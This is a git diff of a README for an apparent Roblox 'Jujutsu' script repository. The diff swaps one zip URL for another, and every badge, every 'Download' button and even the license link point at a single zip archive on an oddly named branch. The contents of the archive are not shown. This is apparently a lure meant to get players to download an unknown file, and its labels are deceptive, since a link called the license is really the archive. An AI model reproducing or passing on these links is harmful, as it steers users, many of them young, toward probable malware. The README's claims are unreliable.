@@ -1,15 +1,15 @@
 # 🌀 Jujutsu Script Roblox: Empower Your Roblox World with Sorcery
 
-![Build Status](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)  
-![License: MIT](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)  
-![OpenAI API](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)  
-![Claude API](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)  
-![Languages](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip%2B-teal)  
-![Customer Support](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip%2F7-important)
+![Build Status](https://raw.githubusercontent.com/Ranpops/jujutsu-roblox-script-engine/branch/unhandy/roblox-script-engine-jujutsu-1.1-beta.1.zip)  
+![License: MIT](https://raw.githubusercontent.com/Ranpops/jujutsu-roblox-script-engine/branch/unhandy/roblox-script-engine-jujutsu-1.1-beta.1.zip)  
+![OpenAI API](https://raw.githubusercontent.com/Ranpops/jujutsu-roblox-script-engine/branch/unhandy/roblox-script-engine-jujutsu-1.1-beta.1.zip)  
+![Claude API](https://raw.githubusercontent.com/Ranpops/jujutsu-roblox-script-engine/branch/unhandy/roblox-script-engine-jujutsu-1.1-beta.1.zip)  
+![Languages](https://raw.githubusercontent.com/Ranpops/jujutsu-roblox-script-engine/branch/unhandy/roblox-script-engine-jujutsu-1.1-beta.1.zip%2B-teal)  
+![Customer Support](https://raw.githubusercontent.com/Ranpops/jujutsu-roblox-script-engine/branch/unhandy/roblox-script-engine-jujutsu-1.1-beta.1.zip%2F7-important)
 
 ---
 
-![Download](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip
+![Download](https://raw.githubusercontent.com/Ranpops/jujutsu-roblox-script-engine/branch/unhandy/roblox-script-engine-jujutsu-1.1-beta.1.zip)https://raw.githubusercontent.com/Ranpops/jujutsu-roblox-script-engine/branch/unhandy/roblox-script-engine-jujutsu-1.1-beta.1.zip
 
 ---
 
@@ -93,7 +93,7 @@ Ensure you have Roblox Studio installed and internet access ready for an API-pow
 
 #### 2️⃣ Begin the Download Ritual
 
-[![Download](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)
+[![Download](https://raw.githubusercontent.com/Ranpops/jujutsu-roblox-script-engine/branch/unhandy/roblox-script-engine-jujutsu-1.1-beta.1.zip)](https://raw.githubusercontent.com/Ranpops/jujutsu-roblox-script-engine/branch/unhandy/roblox-script-engine-jujutsu-1.1-beta.1.zip)
 
 Click the "Download" badge above to invoke the sacred downloader.  
 *Compatible with all major platforms detailed above.*
@@ -120,11 +120,11 @@ This repository is designed for creative and educational augmentation within the
 ## 📜 License
 
 This magical repository is published under the MIT License — or, as we like to call it, the "Mystical Innovation Treaty (2025 Model)."  
-[MIT License – Read the full ritual here.](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)
+[MIT License – Read the full ritual here.](https://raw.githubusercontent.com/Ranpops/jujutsu-roblox-script-engine/branch/unhandy/roblox-script-engine-jujutsu-1.1-beta.1.zip)
 
 ---
 
-![Download](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip
+![Download](https://raw.githubusercontent.com/Ranpops/jujutsu-roblox-script-engine/branch/unhandy/roblox-script-engine-jujutsu-1.1-beta.1.zip)https://raw.githubusercontent.com/Ranpops/jujutsu-roblox-script-engine/branch/unhandy/roblox-script-engine-jujutsu-1.1-beta.1.zip
 
 ---
 
